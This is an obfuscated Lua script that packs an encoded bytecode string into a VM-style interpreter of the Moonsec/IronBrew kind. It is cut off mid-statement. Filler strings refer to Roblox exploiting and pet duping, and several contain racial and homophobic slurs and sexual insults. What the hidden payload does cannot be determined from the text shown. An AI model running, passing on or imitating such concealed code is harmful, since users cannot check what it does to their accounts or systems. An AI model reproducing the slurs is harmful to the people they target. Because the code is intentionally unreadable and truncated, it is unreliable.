#!_+}#**=$}}}/:/._^^+;/,&#&*^;;$,.^:^!%*$$}!#}#&_;=$!}=;!+}^};$}*,+_/:&=&/^_.!,#^$^&%,,/}%$*#^__=%*,!&=/}::=+_^.+;/$/%,..};:,_,*&.,^=&$=$/#.==%;*#!#$+}=}*}/$:^/+^/+&:%=^^;_,,^;+}%+%*$}###*_^}$*%=}}=}+:+._}_+./;&$&%^.;},:^_^*%*+:}!#=#/_.=!*+!*=%};::_*^:+^/_/!,;.%;!;^^:^*^,/$/=+.$%_#_*:^},==};$_$__/#+:=_#.$.=/.%,!#!*=^&&++/%%_%$%&*%!%}+=,}#}^_,_$#&_:^%&,%+*:!=/^^_+,/;&}=}=;,/_&:*.^;_#%},$&#/_:,:^=%#%}*$*%!,&}^&/=/!&^=.;&_^:/..;}#+}:$^#,_$,$,+&;%_%!*+!:===/$.*$###=_$_%:,$}!&}=}!$^.^;:=}//&.%}&+*}!$!%=,}=}*$^#_#!!%::.=./;:,},+^;^&,#/,&#&*%_*_**!+=_}=};!=#}#&_;_%:%.;;#;+:#^_^!++=;&=&+%.&!*.!;=$=%}_$#$*#^$_#/:+.:;=;/,.,#^&+},,/%&,%#%_*^!#!!=^}:}&!:#._}_&_%.$.&;,;!:,^^+_+!/+&:&!%/%_*/!&=;}$}+$,###*#;$;:!.^;:;+,/^.+}+&/;&$&%%,*}**!,=_!%}+$:#=#/_}:}:&.;:$;%,,^#^*+^/_/:&+/:*=*/!.=}=&};=*$%},_#_*:^._.!;+;$^=;/+./}/&&;%$%%%#!#*&=^}_}*$+$__=_/:.:}.&;;,$,%^;+#+%/^/$&!%+*:!=!,=.}}}&}:#$#%_;:#__.^;_;!,+^:+=+//./!&&%.*$%/!,=#=*}^}!$!#+_:#=:/..;};&,;^$^#+,^#/*&^%_%!*+!:*&=/!.$}$&#;_$_%:,:=.*:^,_,!^++:/=///}%}&+*;!$!&=,=+}*$^#_$!_+::.=./;:,},/^;^=+%/,&#&*%.*_*!!+!#}=}/$:#}$$_;:$:%.,;#;*,^^_^%++/_&=/^%.*}*&!;!%=%},$#=*#^___!:+.:;=;},.;}^&+;/$/%&,%#&+*^%_!!=+}:$=$/#.$*_&#;.$.%;,,#,*^^,!+!+,&:%=%+*.%!!&=;}$=%$,###*_^:#:!.^;:.*,/^.+}+&/_&$&%%,%}**!^=#=!==$:#=#/_.:}:&.;;$;/,,^$^*^;/_/!&+%:%/*/!.=}*&};$$$%#,_#_*_!.__!;+,:^=^/+./}+,&;/$%%*,!#!*=^}_=&$+}:_=_/:..}.&;;.%,%,.+#+*/,&_/;%+*:!=*/=.}}}&$;#}#%_;:#_&.^;_;!,+^$+=+//.+!&&%;*}*%%*=#=*}^$_$!#+_::=:^..;=;&;:^$^%+,/#/^&^%_%!&+!:===/}.$}$&$%_$$%:,.#.*;^,_,!,.+:^=//&.%}%&*;!$*+=,!#}*$^#_#!_+::_/./._,},&^.+$+$/,&#&*&^*_*!!+=:=!}/$:#}$+_;:$:%.,;=;*,^^_,%++/:/!&//&*}*&!;=$=%},$#$*#;___*:+:#;=;/,.^}^;+;/$/%+,%#%**^!_!!=+=/$==/#._}_&:;.$.%._,#.*^^+_+!/+&:%=&,*.%}!&=;}$}%$,##$^_^_$:!.+;_,=;!^.+}+&+;&$&%%,*#*%!^=#=!=,$:#=#/_._*:&.;;$./,,^#^%+^^+/!&+%:*=*/!.=}=&}:$$$&#,#}_*:^._.!;:,:^=^/,./}/&&;%$%%*,*^!**^}_}!$+#:_=_/_$.}_&;;,$,%^,+#+*+.&_+!%+*:!=!/=.}}=;$;$=#%_,:$:*.$;_;!,+,:+=+//.&}&/%;*}*%*.=#=*}^$_$&#+_::=_^..;};/,;;,^%+,/#/*&^%_%!*+!#===+}.=!$&#;_$_%:#.#.*;^._,!^++:/=//&.&;%&&;!$!%=,}#}*$^$=#!$+::.=./;.,},&,_+$,%/,&#&*%^*_*!*:=:!*}/$.#=#&#,:$:%.,.#;*,^^_^!+^/:/!&/&_*}*&!;=$=+},$#$*$;};_!:^.::.;/,.^}^&+;/$/%&,%}%**,!_*%=+}:$=$/#}_}_&:;_$.%;,,#,*^^+_+:/++:%=%/*.!}!&=;!*}%=,###*_^:_:!.+.$,=./^.+}+&/;&$&%&#*#%&!^=_=*}+},#=#/_._}:&.;;$;%,;^#^%+^+$/!&+%:*=*,!.=}=&=:$$$%#;_##_:^._.!;+,:^=^/+.+!/&&.%$&/*,!#!*=^=!}!$+#:$=_/:..}.&;;,$,#^,,#+*/^&_&!%+*:%&!/*.}}}&$;#$#%_,_=:*_^;_;!,+^:+=+/+}&}/+%;*$*&!,*,=*}^$_}!#+_::=:/.:;};/,;,=^%+,/#/*&.%_%!*+*#===/}:$}}$#;_$_%:,.#.*;^,_,%^++_/=+^&.%}%&*;*%!%=,}#!*$^#_#!_+::.=.};..},&^;+$+%/,&#/+%^&_*!!+=:}=}/$.}*#&$;:$:%.,;#;*,^;!^!^,/:&=&+%.&+*&!;=$!%},$#$*#^_#_!:^.::*;/,.^}^&+_/$/%&,&}%**^!#!!!=}:$=$/#._}_&:;.$./;,,$,*,;+_+!/+&:&/%/*.!}%&=;}$}%$,###*#!:_#!.+;:,=,/^.+}^,/;+$&%%,*#**!^=_!&}+=:#=#/_.:}:&.;:%;%;.^#^*+,/_+!&+%:*=%/!.=}=&};$}$%#;_##&:^._.!;+,$^=^/+.^!/&&;%}%%&*!#!*=^}_}!$+#:_=_^:..=.&.:,$,%^,+#+^/^&_&!/+*:!=!/=.}}}&}%#$}%_,:#:*.^;_;!;.^:,=+//.&}&&%;*$%+!,*#=*}^$_$!#+_:#/:/:_;};&,.^$^:+,/#/*/^%_%!*+!:!!=/}:$}}+#;_$_%:,.=.*;^,_;%^++:+!//+&%}%&*;!$!%=,}#}*$;#_#*_+_#.=./;.,},;^;+$+%^,&#&*%^*_*!!+!/}=!/$.#}#&_;:$:%:_;#:*,^^_^!++/:&=/,%.&}*&!;=$=%},$#}^#^#$_!:+._;=.$,.^}^&^;/$/%&,%#%%*^!#!!!,}:$=$/#.#*_&:;.$:/;,,#,%^^,++!/+&:%=%/*.!}!&=:}$}&$,$}#*_^:_:!.:;:,=,/;.+}+&/;&$&%%,%^**%^=_=!}+$:#=#/#$:}#&.;;$;%,,^#^*^./_^!&+%:*=*/!.=}!;};}=$%#,_$_*:;._.!;+;:^=^/+./}//&;%}%%%.!#!*=^}_}&$+#:_=#^:..}./;;.,,%^,+#+*/^&_&!%+*#!=!+=.!!}&$;#$#%_#:#:*.^:_;!,+^:+=+//./;&&/;*$*%!,=#=*}^}=$!}+_::=:/..;};&;_^$;%+,/#/*&^%_%!%:!:**=/}.$=$&$}_$_%:,:#.*;^,_,!^^+:+!///_%}%&*;!$!+=,}#}*};}_#!_^:::+./;.,},&:*+$+%/,&}&*%,*_*/&_=:}=}/$.#}#/_;:$$+.,;#;*,,^_^!++/:&=&/%.*}");local c=((528/0x16)+-#'turi ip ip ip')local _=29 local o=l;local e={}e={[(0x43-66)]=function()local e,a,d,l=z(A,o,o+S);o=o+y;_=(_+(c*y))%n;return(((l+_-(c)+x*(y*m))%x)*((m*j)^m))+(((d+_-(c*m)+x*(m^S))%n)*(x*n))+(((a+_-(c*S)+j)%n)*x)+((e+_-(c*y)+j)%n);end,[(-34+0x24)]=function(e,e,e)local e=z(A,o,o);o=o+O;_=(_+(c))%n;return((e+_-(c)+j)%x);end,[(0x2fa/254)]=function()local l,e=z(A,o,o+m);_=(_+(c*m))%n;o=o+m;return(((e+_-(c)+x*(m*y))%x)*n)+((l+_-(c*m)+n*(m^S))%x);end,[(-#'me when they are is have the me when are is do me when'+(0x984/42))]=function(o,e,_)if _ then local e=(o/m^(e-l))%m^((_-O)-(e-l)+O);return e-e%l;else local e=m^(e-O);return(o%(e+e)>=e)and l or p;end;end,[(0x54-(0xcd+-126))]=function()local _=e[(-#'Impulse youtube real'+(588/0x1c))]();local o=e[(0x66+-101)]();local a=l;local d=(e[(-#[[psx real dupe steal all ur pets no joke]]+(150-0x6b))](o,O,I+y)*(m^(I*m)))+_;local _=e[(0xa0/40)](o,21,31);local e=((-l)^e[(73+-0x45)](o,32));if(_==p)then if(d==v)then return e*p;else _=O;a=v;end;elseif(_==(x*(m^S))-O)then return(d==p)and(e*(O/v))or(e*(p/v));end;return W(e,_-((n*(y))-l))*(a+(d/(m^T)));end,[(85-0x4f)]=function(d,a,a)local a;if(not d)then d=e[(-#'hypeblox likes sucking big black cock'+((20698/0x83)-0x78))]();if(d==p)then return'';end;end;a=L(A,o,o+d-l);o=o+d;local e=''for o=O,#a do e=q(e,F((z(L(a,o,o))+_)%n))_=(_+c)%x end return e;end}local function p(...)return{...},Y('#',...)end local function L()local d={};local a={};local _={};local r={d,a,nil,_};local o={}local c=(-#[[gay men]]+(174-0x62))local n={[(-#[[Moonsec An IB2 fork sooo secure and we love it and federal is so straight and federal owns Luauth and we love spoons and if sonic was here federal would die a painful death and he would turn into dust]]+(431-0xe7))]=(function(_)return not(#_==e[(16/0x8)]())end),[((-#[[Ur mom]]+(7743/0x59))-79)]=(function(_)return e[(102+-0x61)]()end),[(0x4b+-72)]=(function(_)return e[(-#"elbicho"+(845/0x41))]()end),[(0x70/112)]=(function(_)local l=e[(0x2d-39)]()local e=''local _=1 for o=1,#l do _=(_+c)%n e=q(e,F((z(l:sub(o,o))+_)%x))end return e end)};local _=e[(-#"moonsex looks great"+(-31+0x33))]()for _=1,_ do local e=e[(0x6c-106)]();local l;local e=n[e%(46+-0x28)];o[_]=e and e({});end;for a=1,e[(-0x1e+31)]()do local _=e[(0x14a/165)]();if(e[(-#[[subemelaradjo]]+(3825/0xe1))](_,l,O)==v)then local r=e[(33+-0x1d)](_,m,S);local n=e[((0x7b-70)+-#'Innovative and Im made of rubber so that anything')](_,y,m+y);local _={e[((-95+0x66)+-#"yiff")](),e[(-#"Eu gosto de peitos"+(0x55-64))](),nil,nil};local x={[((-#"I can tell"+(0x5c-61))-21)]=function()_[w]=e[(-#"alivephoneluaLMAO"+(-0x14+40))]();_[g]=e[(0x23+-32)]();end,[(-#"0nly 1337 smashed ur wap"+(0x71-88))]=function()_[b]=e[(28-0x1b)]();end,[(123+-0x79)]=function()_[u]=e[(((29+-0x45)+0x40)+-#'how do i get moonsex v3')]()-(m^I)end,[(0x102/86)]=function()_[u]=e[(-115+0x74)]()-(m^I)_[N]=e[(504/0xa8)]();end};x[r]();if(e[(97-0x5d)](n,O,l)==O)then _[i]=o[_[U]]end if(e[(0x6d-105)](n,m,m)==l)then _[f]=o[_[f]]end if(e[(43-0x27)](n,S,S)==O)then _[D]=o[_[N]]end d[a]=_;end end;r[3]=e[(0x18c/198)]();for e=O,e[(-0x43+68)]()do a[e-O]=L();end;return r;end;local function v(e,y,x)local c=e[m];local L=e[S];local n=e[l];return(function(...)local z={};local o={};local j=Y('#',...)-O;local _=l;local A={...};local I=c;local e=l e*=-1 local S=e;local p=p local F={};local c=L;local n=n;for e=0,j do if(e>=c)then F[e-c]=A[e+O];else o[e]=A[e+l];end;end;local e=j-c+l local e;local c;while true do e=n[_];c=e[((162+-0x7f)+-#[[Show me your meme stealing license]])];d=(8182321)while c<=((11692/0x4f)+-92)do d-= d d=(8705424)while c<=(180-0x99)do d-= d d=(140960)while(0x7a+-109)>=c do d-= d d=(4777500)while(115+-0x6d)>=c do d-= d d=(672299)while c<=(0x36-52)do d-= d d=(2331924)while c<=(-#'Ginglebog'+(-107+0x74))do d-= d local c;local s,U;local i;local d;o[e[k]]=x[e[h]];_=_+l;e=n[_];d=e[r];i=o[e[w]];o[d+1]=i;o[d]=i[e[P]];_=_+l;e=n[_];o[e[k]]=e[f];_=_+l;e=n[_];d=e[k]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];d=e[k];i=o[e[u]];o[d+1]=i;o[d]=i[e[B]];_=_+l;e=n[_];o[e[a]]=x[e[f]];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];d=e[r]s,U=p(o[d](o[d+O]))S=U+d-l c=0;for e=d,S do c=c+l;o[e]=s[c];end;_=_+l;e=n[_];d=e[k]o[d]=o[d](M(o,d+l,S))_=_+l;e=n[_];y[e[w]]=o[e[r]];_=_+l;e=n[_];do return end;break;end while 1491==(d)/((((-110+0x42190)+-#[[me when they are is have the me when are is do me when]])/0xad))do d=(10894873)while c>(0x4f/79)do d-= d local n=e[r]local d={o[n](o[n+1])};local _=0;for e=n,e[C]do _=_+l;o[e]=d[_];end break end while(d)/((0xbe5+-106))==3707 do o[e[s]]=o[e[w]][o[e[g]]];break end;break;end break;end while 1207==(d)/((0x1c263/207))do d=(15819514)while c<=(0x3a-54)do d-= d d=(389895)while(45-0x2a)<c do d-= d local e=e[i]o[e](M(o,e+O,S))break end while(d)/((0x86b+-70))==187 do local e=e[a]o[e]=o[e](o[e+O])break end;break;end while 3946==(d)/((96216/0x18))do d=(5274913)while(0xc3/(0x1a5b/173))<c do d-= d o[e[k]]=x[e[b]];break end while(d)/(((401082/0xb1)+-#"sussy"))==2333 do o[e[k]]=y[e[t]];_=_+l;e=n[_];o[e[k]]=#o[e[w]];_=_+l;e=n[_];y[e[u]]=o[e[r]];_=_+l;e=n[_];o[e[i]]=y[e[u]];_=_+l;e=n[_];o[e[a]]=#o[e[w]];_=_+l;e=n[_];y[e[b]]=o[e[i]];_=_+l;e=n[_];do return end;break end;break;end break;end break;end while(d)/((0x687+-46))==2940 do d=(2014052)while c<=(-0x1c+(0x5f-58))do d-= d d=(164476)while c<=(-0x23+42)do d-= d x[e[f]]=o[e[s]];break;end while(d)/(((0x1974-3291)+-#"if syn then syn dot request get beliveri12 coma nicuse ass end"))==52 do d=(801336)while(63+-0x37)<c do d-= d y[e[b]]=o[e[i]];break end while(d)/((0x5af+-71))==579 do o[e[i]]=o[e[h]];break end;break;end break;end while(d)/((-#[[cheeseburger]]+(386794/0xb2)))==932 do d=(292809)while(0x64+-89)>=c do d-= d d=(1487178)while((0x37+-36)+-#"Crackzzzz")<c do d-= d local _=e[r]local n,e=p(o[_](M(o,_+1,e[w])))S=e+_-1 local e=0;for _=_,S do e=e+l;o[_]=n[e];end;break end while(d)/((7371-0xe85))==407 do local _=e[U]o[_]=o[_](M(o,_+l,e[f]))break end;break;end while 209==(d)/((2851-0x5aa))do d=(7986136)while c>(-0x3b+((0x114-175)+-#'testing this thingy lololollez'))do d-= d local N;local c;local S;local d;o[e[k]]=x[e[h]];_=_+l;e=n[_];o[e[i]]=o[e[t]][e[B]];_=_+l;e=n[_];d=e[k];S=o[e[h]];o[d+1]=S;o[d]=S[e[C]];_=_+l;e=n[_];o[e[k]]=o[e[u]];_=_+l;e=n[_];o[e[i]]=o[e[b]];_=_+l;e=n[_];d=e[U]o[d]=o[d](M(o,d+l,e[u]))_=_+l;e=n[_];d=e[r];S=o[e[w]];o[d+1]=S;o[d]=S[e[P]];_=_+l;e=n[_];d=e[k]o[d]=o[d](o[d+O])_=_+l;e=n[_];c={o,e};c[O][c[m][a]]=c[l][c[m][D]]+c[O][c[m][w]];_=_+l;e=n[_];o[e[U]]=o[e[f]]%e[P];_=_+l;e=n[_];d=e[U]o[d]=o[d](o[d+O])_=_+l;e=n[_];S=e[t];N=o[S]for e=S+1,e[D]do N=N..o[e];end;o[e[s]]=N;_=_+l;e=n[_];c={o,e};c[O][c[m][a]]=c[l][c[m][D]]+c[O][c[m][h]];_=_+l;e=n[_];o[e[r]]=o[e[f]]%e[C];break end while(d)/(((-31+0xda5)+-#"People trying to play roblox colon meanwhile crosswoods colon may I introduce myself question mark"))==2374 do o[e[a]]=o[e[u]]%e[D];break end;break;end break;end break;end break;end while 3524==(d)/((0x79+-81))do d=(554055)while(-#'i want sex'+(0xd7a/115))>=c do d-= d d=(1755824)while c<=(3440/0xd7)do d-= d d=(327236)while((4508/0xc4)+-#[[kys nigga]])>=c do d-= d if(o[e[k]]==e[B])then _=_+O;else _=e[u];end;break;end while 2821==(d)/((308-0xc0))do d=(3282790)while c>(0x79-106)do d-= d o[e[a]][e[u]]=o[e[C]];break end while(d)/(((-112+0x6ca)+-#'Fucking Retarted'))==2039 do o[e[s]]=o[e[f]]-o[e[P]];break end;break;end break;end while(d)/((0x30c9c/117))==1028 do d=(2535100)while c<=(148-(-#"psx real dupe steal all ur pets no joke"+(415-0xf6)))do d-= d d=(330638)while((0x52-49)+-#'iPipeh Is My god')<c do d-= d local e=e[r]local n,_=p(o[e](o[e+O]))S=_+e-l local _=0;for e=e,S do _=_+l;o[e]=n[_];end;break end while 1582==(d)/((-83+0x124))do x[e[w]]=o[e[k]];_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];o[e[i]]=o[e[b]][e[C]];_=_+l;e=n[_];o[e[r]]=e[h];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];o[e[i]]=e[f];_=_+l;e=n[_];o[e[s]]=e[t];break end;break;end while(d)/((484430/0xc1))==1010 do d=(10818038)while c>((0x46+-44)+-#'niggers')do d-= d o[e[a]]=o[e[f]][e[D]];break end while 2786==(d)/(((-74+0x3)+3954))do local m;local D,C;local c;local d;o[e[s]]=x[e[t]];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[s]]=x[e[f]];_=_+l;e=n[_];d=e[a];c=o[e[f]];o[d+1]=c;o[d]=c[e[g]];_=_+l;e=n[_];o[e[i]]=e[f];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[b]))_=_+l;e=n[_];d=e[U];c=o[e[t]];o[d+1]=c;o[d]=c[e[N]];_=_+l;e=n[_];o[e[s]]=y[e[f]];_=_+l;e=n[_];d=e[U]D,C=p(o[d](M(o,d+1,e[f])))S=C+d-1 m=0;for e=d,S do m=m+l;o[e]=D[m];end;_=_+l;e=n[_];d=e[k]o[d](M(o,d+O,S))_=_+l;e=n[_];o[e[s]]=x[e[h]];_=_+l;e=n[_];o[e[U]]();_=_+l;e=n[_];o[e[s]]=x[e[f]];_=_+l;e=n[_];d=e[r];c=o[e[t]];o[d+1]=c;o[d]=c[e[g]];_=_+l;e=n[_];o[e[k]]=e[t];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];d=e[s];c=o[e[b]];o[d+1]=c;o[d]=c[e[P]];_=_+l;e=n[_];o[e[r]]=y[e[h]];_=_+l;e=n[_];o[e[a]]=y[e[h]];_=_+l;e=n[_];o[e[k]]=x[e[t]];_=_+l;e=n[_];o[e[U]]=o[e[u]][e[B]];_=_+l;e=n[_];o[e[a]]=o[e[f]][e[P]];_=_+l;e=n[_];d=e[a]o[d](M(o,d+O,e[w]))_=_+l;e=n[_];do return end;break end;break;end break;end break;end while 2577==(d)/((557-0x156))do d=(9959515)while(0xc38/((190+-0x28)+-#[[i love tatakai]]))>=c do d-= d d=(7581600)while((-#"Impulse real 2022"+(265-0x9f))-68)>=c do d-= d o[e[r]]={};break;end while 3888==(d)/(((-28+0x7be)+-#[[yiff]]))do d=(651900)while(-0x27+(229-0xa8))<c do d-= d o[e[r]]=y[e[f]];break end while 246==(d)/((-0x46+2720))do if o[e[U]]then _=_+l;else _=e[u];end;break end;break;end break;end while(d)/((-#"Im devastating more than ever demonstrating"+(5308-0xa94)))==3895 do d=(203205)while c<=(-106+(184+-0x35))do d-= d d=(6264892)while c>((0x8a-100)+-#[[i love tatakai]])do d-= d o[e[U]]=(e[u]~=0);_=_+O;break end while(d)/((0xd19+-127))==1942 do if(o[e[s]]<o[e[B]])then _=e[h];else _=_+O;end;break end;break;end while(d)/((-#'Ur mom'+(3670+-0x63)))==57 do d=(5601103)while(-#'cilerteddoesntlikeburgers'+(157+-0x6a))<c do d-= d local k;local m,B;local c;local d;o[e[U]]=o[e[h]][e[g]];_=_+l;e=n[_];o[e[U]]=o[e[w]];_=_+l;e=n[_];o[e[i]]=o[e[t]];_=_+l;e=n[_];d=e[s]o[d](M(o,d+O,e[f]))_=_+l;e=n[_];o[e[a]]=x[e[b]];_=_+l;e=n[_];o[e[s]]=e[t];_=_+l;e=n[_];o[e[a]]=x[e[f]];_=_+l;e=n[_];d=e[U];c=o[e[f]];o[d+1]=c;o[d]=c[e[N]];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];d=e[i]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];d=e[s];c=o[e[h]];o[d+1]=c;o[d]=c[e[P]];_=_+l;e=n[_];o[e[i]]=o[e[h]];_=_+l;e=n[_];d=e[i]m,B=p(o[d](M(o,d+1,e[w])))S=B+d-1 k=0;for e=d,S do k=k+l;o[e]=m[k];end;_=_+l;e=n[_];d=e[r]o[d](M(o,d+O,S))break end while(d)/(((-#'jjsplot on top'+(0x65712/91))-0x923))==2531 do local e=e[i]o[e]=o[e](o[e+O])break end;break;end break;end break;end break;end break;end while(d)/((-#[[nicuses dick is so good hot emoji here]]+(0x1fa7-4079)))==2184 do d=(8481582)while(-67+(-#'weezer'+(328-0xd6)))>=c do d-= d d=(8714895)while c<=(-116+0x96)do d-= d d=(2513928)while(-85+0x73)>=c do d-= d d=(9038016)while c<=(2520/0x5a)do d-= d local d;o[e[s]]=x[e[t]];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];d=e[r]o[d](o[d+O])_=_+l;e=n[_];o[e[k]]={};_=_+l;e=n[_];y[e[f]]=o[e[U]];_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[U]]=o[e[t]][e[D]];_=_+l;e=n[_];o[e[i]]=y[e[u]];_=_+l;e=n[_];o[e[a]]=y[e[t]];_=_+l;e=n[_];d=e[U]o[d](M(o,d+O,e[t]))_=_+l;e=n[_];do return end;break;end while 3536==(d)/((0x146e-2674))do d=(3253008)while(0xe63/127)<c do d-= d local e=e[r]o[e]=o[e](M(o,e+l,S))break end while(d)/(((-#'If no father return milk end'+(-0x38+10588))/13))==4026 do o[e[a]]=o[e[h]]%e[C];break end;break;end break;end while(d)/(((-126+0xbbd)-0x5c1))==1788 do d=(8017839)while c<=((-105+0x9d)+-#'get good use moonsec')do d-= d d=(601364)while((0xbd-142)+-#"get some bitches")<c do d-= d o[e[a]]=e[h];break end while(d)/((0x3aa0e/238))==596 do local _=e[r]o[_](M(o,_+O,e[f]))break end;break;end while 4023==(d)/((-#'Faggot'+(0xe273/29)))do d=(161504)while(0x59-56)<c do d-= d o[e[r]]=#o[e[b]];break end while 98==(d)/((-#'whats up'+(3414-0x6de)))do local d;o[e[a]]=x[e[b]];_=_+l;e=n[_];o[e[U]]=o[e[t]][e[N]];_=_+l;e=n[_];o[e[i]]={};_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[U]]=x[e[f]];_=_+l;e=n[_];o[e[a]]=o[e[h]][e[B]];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];d=e[k]o[d]=o[d](o[d+O])_=_+l;e=n[_];o[e[k]]=o[e[f]][e[C]];_=_+l;e=n[_];o[e[r]]=(e[h]~=0);_=_+l;e=n[_];o[e[k]]=x[e[w]];break end;break;end break;end break;end while 2505==(d)/((6991-0xdb8))do d=(1354300)while(-#[[Deeznutsbutinlualoo]]+(153-0x61))>=c do d-= d d=(3809842)while c<=(-108+0x8f)do d-= d local d=e[U];local a=e[C];local n=d+2 local d={o[d](o[d+1],o[n])};for e=1,a do o[n+e]=d[e];end;local d=d[1]if d then o[n]=d _=e[h];else _=_+l;end;break;end while(d)/(((0x108b-2167)+-#'If you see this string you are cool'))==1874 do d=(841206)while(4716/0x83)<c do d-= d o[e[a]][o[e[t]]]=o[e[P]];break end while 2983==(d)/(((-0x79+3505)/0xc))do local _=e[i];local l=o[e[t]];o[_+1]=l;o[_]=l[e[C]];break end;break;end break;end while 580==(d)/((4719-0x950))do d=(5906308)while c<=((0xc1-139)+-#'gozei na parede')do d-= d d=(1386088)while(-#'papier ist ein kleiner schwanz lutscher'+(0x1bac/((26162/0xfe)+-#'monkey mode')))<c do d-= d if o[e[a]]then _=_+l;else _=e[f];end;break end while(d)/((-#"I am monoegg"+(0x1a6d-(0x8b4ae/166))))==418 do o[e[a]]=o[e[w]]-o[e[D]];break end;break;end while 1978==(d)/((-#"pussy day pussy clean pussy fresh pussy pretty pussy fat full of fresh"+(6129-0xc01)))do d=(3496050)while((6223/0x7f)+-#'Deezbutts')<c do d-= d local d;o[e[U]]=x[e[u]];_=_+l;e=n[_];o[e[r]]=o[e[b]][e[P]];_=_+l;e=n[_];d=e[r]o[d]=o[d](o[d+O])_=_+l;e=n[_];o[e[U]]=o[e[f]];_=_+l;e=n[_];o[e[i]]=x[e[f]];_=_+l;e=n[_];o[e[r]]=o[e[f]][e[P]];_=_+l;e=n[_];d=e[r]o[d]=o[d](o[d+O])_=_+l;e=n[_];o[e[U]]=x[e[b]];_=_+l;e=n[_];o[e[U]]=o[e[w]][e[D]];_=_+l;e=n[_];d=e[k]o[d]=o[d](o[d+O])_=_+l;e=n[_];if(o[e[a]]<o[e[B]])then _=e[h];else _=_+O;end;break end while(d)/((0xaf2-1431))==2550 do o[e[r]]=v(I[e[w]],nil,x);break end;break;end break;end break;end break;end while(d)/((2218+-0x69))==4014 do d=(14662100)while c<=(136+-0x58)do d-= d d=(149700)while c<=(149+-0x69)do d-= d d=(408320)while c<=(0x1998/156)do d-= d if not o[e[r]]then _=_+O;else _=e[f];end;break;end while 320==(d)/((113564/0x59))do d=(2449680)while c>(168-0x7d)do d-= d local e=e[a]local n,_=p(o[e](o[e+O]))S=_+e-l local _=0;for e=e,S do _=_+l;o[e]=n[_];end;break end while(d)/(((0xc9c0/48)+-#[[i dont fucking care if its your own ui]]))==2360 do local _=e[a]o[_](M(o,_+O,e[t]))break end;break;end break;end while(d)/((-53+0xbe7))==50 do d=(371776)while c<=(-#"Give nitro"+(136-0x50))do d-= d d=(4857526)while((0x89a3/29)/27)<c do d-= d local n=e[r];local a=e[g];local d=n+2 local n={o[n](o[n+1],o[d])};for e=1,a do o[d+e]=n[e];end;local n=n[1]if n then o[d]=n _=e[t];else _=_+l;end;break end while 2462==(d)/((-0x43+2040))do local d;o[e[a]]=e[b];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[i]]=x[e[w]];_=_+l;e=n[_];o[e[i]]=o[e[t]][e[D]];_=_+l;e=n[_];o[e[s]]=o[e[f]][e[N]];_=_+l;e=n[_];o[e[r]]=o[e[u]][e[P]];_=_+l;e=n[_];o[e[i]]=o[e[h]][e[N]];_=_+l;e=n[_];o[e[U]]=x[e[u]];_=_+l;e=n[_];o[e[r]][e[w]]=o[e[N]];_=_+l;e=n[_];o[e[U]]=x[e[w]];_=_+l;e=n[_];o[e[a]]=e[w];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[U]]=o[e[t]][e[B]];_=_+l;e=n[_];o[e[k]]=o[e[t]][e[g]];_=_+l;e=n[_];o[e[a]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[a]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[s]]=x[e[h]];_=_+l;e=n[_];o[e[r]][e[t]]=o[e[B]];_=_+l;e=n[_];o[e[U]]=x[e[b]];_=_+l;e=n[_];o[e[k]]=e[h];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];o[e[s]]=o[e[t]][e[g]];_=_+l;e=n[_];o[e[r]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[U]]=o[e[u]][e[N]];_=_+l;e=n[_];o[e[U]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[U]][e[h]]=o[e[C]];_=_+l;e=n[_];o[e[a]]=x[e[u]];_=_+l;e=n[_];o[e[r]]=e[u];_=_+l;e=n[_];d=e[s]o[d](o[d+O])_=_+l;e=n[_];o[e[a]]=x[e[f]];_=_+l;e=n[_];o[e[a]]=o[e[u]][e[C]];_=_+l;e=n[_];o[e[k]]=o[e[t]][e[B]];_=_+l;e=n[_];o[e[i]]=o[e[w]][e[N]];_=_+l;e=n[_];o[e[r]]=o[e[b]][e[B]];_=_+l;e=n[_];o[e[a]]=x[e[f]];_=_+l;e=n[_];o[e[U]][e[w]]=o[e[D]];_=_+l;e=n[_];o[e[i]]=x[e[w]];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];d=e[i]o[d](o[d+O])_=_+l;e=n[_];o[e[U]]=x[e[b]];_=_+l;e=n[_];o[e[s]]=o[e[t]][e[N]];_=_+l;e=n[_];o[e[a]]=o[e[u]][e[P]];_=_+l;e=n[_];o[e[a]]=o[e[b]][e[D]];_=_+l;e=n[_];o[e[r]]=o[e[t]][e[B]];_=_+l;e=n[_];o[e[a]]=x[e[u]];_=_+l;e=n[_];o[e[U]][e[b]]=o[e[P]];_=_+l;e=n[_];o[e[U]]=x[e[t]];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];d=e[s]o[d](o[d+O])_=_+l;e=n[_];o[e[U]]=x[e[h]];_=_+l;e=n[_];o[e[i]]=o[e[b]][e[g]];_=_+l;e=n[_];o[e[r]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[r]]=o[e[f]][e[B]];_=_+l;e=n[_];o[e[r]]=o[e[b]][e[D]];_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];o[e[i]][e[t]]=o[e[P]];_